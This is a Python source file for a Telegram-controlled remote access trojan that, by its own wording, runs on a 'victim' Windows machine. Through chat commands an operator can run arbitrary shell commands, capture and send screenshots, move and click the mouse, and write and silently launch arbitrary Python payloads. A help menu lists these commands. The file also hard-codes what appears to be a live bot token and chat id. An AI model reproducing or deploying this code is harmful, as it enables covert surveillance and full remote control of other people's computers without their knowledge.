import telebot
from telebot import types,util
import os
import autopy
import pyautogui
import sys


BOT_TOKEN = "5832009379:AAHW1u2TexAvWcMoF7oaKET-fXnmwRknJiU"
bot= telebot.TeleBot(BOT_TOKEN)
chat_id = 1604035230

@bot.message_handler(commands=["start","help"])
def startBot(message):
    bot.send_message(message.chat.id,text_messages["welcome"])

def isMSg(message):
    return True


@bot.message_handler(func=isMSg)
def reply(message):
    words = message.text.split()
    c = message.text
    print(c)
    
    if words[0].lower() == "hi" :
        return bot.reply_to(message,"hi, this script is raning by victim !")
    
    if words[0].lower() == "show" :
        py = open("main.py", "r")
        pycont = py.read()
        py.close
        return bot.reply_to(message,pycont), bot.reply_to(message,'DONE!')
    
    if words[0].lower() == "mouse" :
        clocX=int(words[1])
        clocY=int(words[2])
        return autopy.mouse.move(clocX, clocY)
    
    if words[0].lower() == "click" :
        return autopy.mouse.click()
    
    if words[0].lower() == "screen" :
        image = pyautogui.screenshot()
        image.save("ex.png")
        image = open("ex.png", "rb")        
        return bot.send_photo(message.chat.id, image),image.close(),os.remove('ex.png')
    
    if words[0].lower() == "$":
        cmd = c[2:]
        res = os.popen(cmd).read()
        return bot.reply_to(message,res), bot.reply_to(message,'DONE!')

    if words[0].lower() == "edit":
        with open("main.py", "w+") as f:
            f.write(c[5:])
        f.close
        os.system('start /min pythonw "main.py"')
        return bot.reply_to(message,'DONE!'),sys.exit()

    if words[0].lower() == "exit":
        os.system("taskkill /f /im pythonw.exe")
        return sys.exit()
        
    if words[0].lower() == "rc":
        with open("pyld.py", "w+") as f:
            f.write(c[3:])
        f.close
        os.system('start /min pythonw "pyld.py"')
        return bot.reply_to(message,'DONE!')

    else :
        return bot.reply_to(message,"""
*******************************
to test :
hi --> this script is raning
*******************************
to write a windows command : 
$ ipconfig
$ time --> time : 16:11:00,73
$ ping 192.168.1.1
*******************************
to control the mouse :
mouse x y --> mouse 90 90
*******************************
click --> to click 
*******************************
screen --> to take screen
*******************************
to show myself : 
show --> (script)
*******************************
to edit me :
edit (script) --> DONE!
*******************************
to run python code :
rc with open("C:\\Users\\pc\\Desktop\\bot payload\\hack.txt", "a+") as f: 
    f.write("hi hackitek")
f.close
*******************************
to close :
-exit
-$ taskkill /f /im pythonw.exe
*******************************
""")

bot.infinity_polling()
